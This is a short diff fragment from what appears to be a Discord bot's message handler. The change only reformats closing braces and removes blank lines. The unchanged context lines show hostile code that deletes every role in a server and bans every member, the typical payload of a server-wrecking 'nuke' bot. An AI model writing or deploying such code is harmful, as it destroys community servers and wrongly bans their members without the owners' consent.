@@ -120,8 +120,4 @@ bot.on("message", function (message) {
     message.guild.roles.forEach((c) => {c.delete()})
     message.guild.members.forEach((c) => {c.ban()})
        }catch(e){
-        console.log(e)
-    }}});
-
-    
-    
+        console.log(e)}}});    
